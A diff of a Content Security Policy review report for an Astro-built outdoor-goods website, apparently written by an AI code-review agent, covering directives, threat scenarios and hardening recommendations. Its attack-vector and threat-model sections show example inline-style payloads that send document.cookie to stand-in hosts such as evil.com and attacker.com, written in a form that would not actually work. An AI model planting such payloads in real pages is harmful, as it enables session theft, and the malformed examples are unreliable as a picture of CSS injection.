@@ -1,4 +1,5 @@
 # CSP Security Analysis Report
+
 **Generated:** 2025-12-11
 **Site:** WV Wild Outdoors (wvwildoutdoors.com)
 **Analyst:** Code Review Agent (Security Focus)
@@ -39,6 +40,7 @@ Content-Security-Policy:
 ### 1. Are There Any XSS Attack Vectors Left Open?
 
 #### ✅ **BLOCKED - Script Injection**
+
 - **Status:** Secure
 - **Configuration:** `script-src 'self'`
 - **Protection:** No inline scripts found in build output
@@ -46,18 +48,21 @@ Content-Security-Policy:
 - **No inline event handlers** (`onclick`, `onload`, etc.) detected
 
 **Evidence:**
+
 ```html
 <!-- All scripts follow this secure pattern: -->
 <script type="module">/* bundled code */</script>
 ```
 
 #### 🔴 **PARTIAL - Style Injection (Critical Finding)**
+
 - **Status:** VULNERABLE
 - **Configuration:** `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`
 - **Risk Level:** MEDIUM-HIGH
 - **Issue:** `'unsafe-inline'` allows ANY inline styles, including malicious CSS
 
 **Current Exposure:**
+
 - **Inline `<style>` blocks:** Found in 4 pages
   - `index.html`: Marquee animation styles
   - `buck-season/index.html`: Checkbox interaction styles
@@ -65,6 +70,7 @@ Content-Security-Policy:
   - `favicon.svg`: SVG styling (acceptable)
 
 - **Inline style attributes:** Found on 7 elements across 3 files
+
   ```html
   <!-- Examples: -->
   <img style="object-position: center" ...>
@@ -73,16 +79,19 @@ Content-Security-Policy:
 
 **Attack Vector:**
 If an attacker can inject HTML (e.g., through XSS in a comment system, user profile, or compromised third-party script), they could inject:
+
 ```html
 <div style="background: url('https://evil.com/steal?cookie=' + document.cookie)"></div>
 ```
 
 #### ✅ **BLOCKED - Object/Embed Injection**
+
 - **Status:** Secure
 - **Configuration:** `object-src 'none'`
 - **Protection:** Blocks `<object>`, `<embed>`, `<applet>` tags
 
 #### ✅ **BLOCKED - Frame Injection**
+
 - **Status:** Secure
 - **Configuration:** `frame-ancestors 'none'`
 - **Protection:** Site cannot be embedded in iframes (prevents clickjacking)
@@ -94,6 +103,7 @@ If an attacker can inject HTML (e.g., through XSS in a comment system, user prof
 #### Current Usage Analysis
 
 **Astro-Generated Inline Styles:**
+
 ```css
 /* index.html - Marquee Animation */
 .animate-marquee[data-astro-cid-kofmyqso] {
@@ -106,6 +116,7 @@ If an attacker can inject HTML (e.g., through XSS in a comment system, user prof
 ```
 
 **Why Astro Generates Inline Styles:**
+
 - Component-scoped CSS with unique identifiers (`data-astro-cid-*`)
 - Critical CSS for above-the-fold content
 - Reduces render-blocking by inlining small, page-specific styles
@@ -113,6 +124,7 @@ If an attacker can inject HTML (e.g., through XSS in a comment system, user prof
 #### ⚠️ **Recommendation: `'unsafe-inline'` IS NECESSARY (but can be improved)**
 
 **Current State:**
+
 - Astro 5.x does not support CSP nonces/hashes for inline styles by default
 - Removing `'unsafe-inline'` would break the marquee animation and component styles
 
@@ -141,21 +153,25 @@ If an attacker can inject HTML (e.g., through XSS in a comment system, user prof
 ### 3. Are There Any Missing Directives That Should Be Added?
 
 #### 🟡 **Missing: `media-src`**
+
 - **Current:** Falls back to `default-src 'self'`
 - **Impact:** Low (no `<video>` or `<audio>` elements currently used)
 - **Recommendation:** Add explicitly: `media-src 'self'`
 
 #### 🟡 **Missing: `worker-src`**
+
 - **Current:** Falls back to `default-src 'self'`
 - **Impact:** Low (no Web Workers detected)
 - **Recommendation:** Add for future-proofing: `worker-src 'self'`
 
 #### 🟡 **Missing: `manifest-src`**
+
 - **Current:** No PWA manifest detected
 - **Impact:** None
 - **Recommendation:** Add if PWA support is added: `manifest-src 'self'`
 
 #### ✅ **Good: `upgrade-insecure-requests` Present**
+
 - Automatically upgrades HTTP to HTTPS
 - Critical for mixed content protection
 
@@ -164,6 +180,7 @@ If an attacker can inject HTML (e.g., through XSS in a comment system, user prof
 ### 4. Would This CSP Cause Any Console Errors or Blocked Resources?
 
 **Tested Scenarios:**
+
 - ✅ Google Fonts load correctly (`https://fonts.googleapis.com` & `https://fonts.gstatic.com`)
 - ✅ Web3Forms API calls succeed (`https://api.web3forms.com`)
 - ✅ YouTube embeds work (`https://www.youtube.com` & `https://www.youtube-nocookie.com`)
@@ -192,17 +209,20 @@ If an attacker can inject HTML (e.g., through XSS in a comment system, user prof
 | **CSP Reporting** | 0/10 | No `report-uri` or `report-to` configured |
 
 **Strengths:**
+
 - ✅ Strong script execution controls (no inline scripts)
 - ✅ Comprehensive third-party domain whitelisting
 - ✅ Good complementary security headers
 - ✅ No dangerous bypasses (`'unsafe-eval'`, wildcards, etc.)
 
 **Weaknesses:**
+
 - 🟡 `'unsafe-inline'` in `style-src` increases CSS injection risk
 - 🟡 Missing `media-src` and `worker-src` directives
 - 🟡 No CSP violation reporting configured
 
 **Risk Assessment:**
+
 - **Current Risk:** LOW-MEDIUM (assumes no other vulnerabilities)
 - **Residual Risk After Fixes:** LOW
 
@@ -211,6 +231,7 @@ If an attacker can inject HTML (e.g., through XSS in a comment system, user prof
 ## Additional Security Findings
 
 ### ✅ **Good: Complementary Security Headers**
+
 ```
 X-Frame-Options: DENY
 X-Content-Type-Options: nosniff
@@ -220,11 +241,13 @@ X-XSS-Protection: 1; mode=block
 ```
 
 ### 🟢 **Good: No Dangerous CSP Bypasses**
+
 - No `'unsafe-eval'` (blocks `eval()`, `Function()`, `setTimeout(string)`)
 - No wildcard sources (`*`, `https:`, `data:` in script-src)
 - No `blob:` or `filesystem:` URIs
 
 ### 🟡 **Watch: Third-Party Dependencies**
+
 - **Web3Forms:** Contact form submission endpoint
   - Risk: If `api.web3forms.com` is compromised, attacker could exfiltrate form data
   - Mitigation: Monitor Web3Forms security advisories
@@ -238,22 +261,28 @@ X-XSS-Protection: 1; mode=block
 ## Threat Modeling
 
 ### Attack Scenario 1: DOM-Based XSS via Inline Styles
+
 **Vector:** Attacker injects malicious HTML through a vulnerable input
+
 ```html
 <!-- If user input is unsanitized: -->
 <div style="background: url('https://attacker.com/log?data=' + btoa(document.cookie))">
 ```
+
 **Impact:** Cookie theft, session hijacking
 **Likelihood:** LOW (requires existing XSS vulnerability)
 **Mitigation:**
+
 - Strict input validation on all forms
 - Use DOMPurify or similar sanitization library if user-generated content is added
 
 ### Attack Scenario 2: Supply Chain Attack via Google Fonts
+
 **Vector:** Attacker compromises `fonts.googleapis.com` or `fonts.gstatic.com`
 **Impact:** Malicious CSS injection, keyloggers, credential theft
 **Likelihood:** VERY LOW (Google's infrastructure is well-secured)
 **Mitigation:**
+
 - Consider self-hosting fonts (removes third-party dependency)
 - Use Subresource Integrity (SRI) if switching to CDN links with static hashes
 
@@ -264,6 +293,7 @@ X-XSS-Protection: 1; mode=block
 ### Immediate (High Priority)
 
 1. **Add Missing Directives:**
+
    ```
    media-src 'self';
    worker-src 'self';
@@ -279,24 +309,27 @@ X-XSS-Protection: 1; mode=block
 
 ### Medium Priority
 
-4. **Consider CSP Reporting:**
+1. **Consider CSP Reporting:**
    - Add `report-uri` or `report-to` directive to log violations:
+
      ```
      report-uri /csp-violation-report;
      ```
+
    - Set up monitoring endpoint to catch attempted attacks
 
-5. **Evaluate Self-Hosted Fonts:**
+2. **Evaluate Self-Hosted Fonts:**
    - Download Google Fonts and serve from `/fonts` directory
    - Update CSP to remove `https://fonts.googleapis.com` and `https://fonts.gstatic.com`
    - **Benefit:** Reduces third-party dependencies, improves privacy
 
 ### Low Priority (Future Enhancements)
 
-6. **CSP Hash Generation:**
+1. **CSP Hash Generation:**
    - Create build script to generate SHA256 hashes for inline `<style>` blocks
    - Replace `'unsafe-inline'` with specific hashes
    - Example implementation:
+
      ```javascript
      // astro.config.mjs
      import crypto from 'crypto';
@@ -314,7 +347,7 @@ X-XSS-Protection: 1; mode=block
      };
      ```
 
-7. **Consider SSR for Dynamic Nonces:**
+2. **Consider SSR for Dynamic Nonces:**
    - If migrating to SSR (e.g., via Cloudflare Workers), implement nonce-based CSP
    - **Benefit:** Eliminates `'unsafe-inline'` entirely
 
@@ -342,6 +375,7 @@ Content-Security-Policy:
 ```
 
 **Changes:**
+
 - ✅ Added `media-src 'self'`
 - ✅ Added `worker-src 'self'`
 - ✅ Added `report-uri /csp-violation-report` (requires endpoint setup)
@@ -374,6 +408,7 @@ curl -I https://wvwildoutdoors.com | grep -i 'content-security-policy'
 Your CSP is **fundamentally sound** with strong script controls and good third-party scoping. The primary weakness is `'unsafe-inline'` in `style-src`, which is currently necessary due to Astro's architecture but increases CSS injection risk.
 
 **Next Steps:**
+
 1. Add missing `media-src` and `worker-src` directives
 2. Implement strict input validation for all forms
 3. Consider CSP hash generation for inline styles (eliminates `'unsafe-inline'`)
